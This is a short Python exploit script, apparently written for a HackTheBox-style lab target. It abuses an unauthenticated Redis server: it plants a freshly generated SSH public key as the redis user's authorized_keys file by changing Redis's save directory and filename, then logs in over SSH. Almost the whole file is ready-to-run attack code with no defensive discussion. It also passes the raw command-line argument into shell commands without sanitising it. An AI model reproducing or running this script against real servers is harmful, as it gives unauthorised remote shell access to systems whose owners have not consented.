#!/usr/bin/python3

# SSH as redis user
# Coder: akrecH
# Github: akr3ch

# import required modules
import os
from termcolor import cprint
import sys
from time import sleep
import socket

# the main funtion
def main():
	cprint('[+] ','yellow',attrs=['bold'],end='')
	cprint('Removing old rsa files','grey',attrs=['bold'])
	os.system('rm /tmp/id_rsa /tmp/id_rsa.pub 2>/dev/null')
	sleep(1)

	cprint('[+] ','yellow',attrs=['bold'],end='')
	cprint('Creating new rsa files','grey',attrs=['bold'])
	os.system("/bin/bash -c 'ssh-keygen -q -t rsa -f /tmp/id_rsa <<<y >/dev/null 2>&1'")
	sleep(1)

	cprint('[+] ','yellow',attrs=['bold'],end='')
	cprint('Creating specific key for redis', 'grey', attrs=['bold'])
	os.system('(echo -e "\n\n"; cat /tmp/id_rsa.pub; echo -e "\n\n") > /tmp/spaced_key.txt')
	sleep(1)

	cprint('[+] ','yellow',attrs=['bold'],end='')
	cprint('Adding the key as ssh-key in redis', 'grey',attrs=['bold'])
	os.system('cat /tmp/spaced_key.txt | redis-cli -h '+sys.argv[1]+' -x set ssh_key  > /dev/null 2>&1')
	sleep(1)

	cprint('[+] ','yellow',attrs=['bold'],end='')
	cprint('Adding config file as /var/lib/redis/.ssh', 'grey',attrs=['bold'])
	os.system('redis-cli -h '+sys.argv[1]+' config set dir /var/lib/redis/.ssh > /dev/null 2>&1')
	sleep(1)

	cprint('[+] ','yellow',attrs=['bold'],end='')
	cprint('Set database filename as authorized_keys', 'grey',attrs=['bold'])
	os.system('redis-cli -h '+sys.argv[1]+' config set dbfilename authorized_keys > /dev/null 2>&1')
	sleep(1)

	cprint('[*] ','blue',attrs=['bold'],end='')
	cprint('Trying to save everything', 'green',attrs=['bold'])
	os.system('redis-cli -h '+sys.argv[1]+' save > /dev/null 2>&1')
	sleep(1)


	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect_ex((sys.argv[1],22))
	if result == 0:
		try:
			cprint('[+] ', 'blue', attrs=['bold'],end='')
			cprint('Trying to SSH with '+sys.argv[1], 'green', attrs=['bold'])
			os.system('ssh -i /tmp/id_rsa redis@'+sys.argv[1])
		except(KeyboardInterrupt):
			cprint('[-] Interrupted by user', 'red', attrs=['bold'])
	else:
		cprint('[!] ', 'yellow', attrs=['bold'],end='')
		cprint('It seems like port 22 is not open','red',attrs=['bold'])
		sock.close()

if len(sys.argv) != 2:
	cprint('[!] ','yellow',attrs=['bold'],end='')
	cprint('Usage: python3 '+sys.argv[0]+' 10.10.10.160','red',attrs=['bold'])
else:
	main()
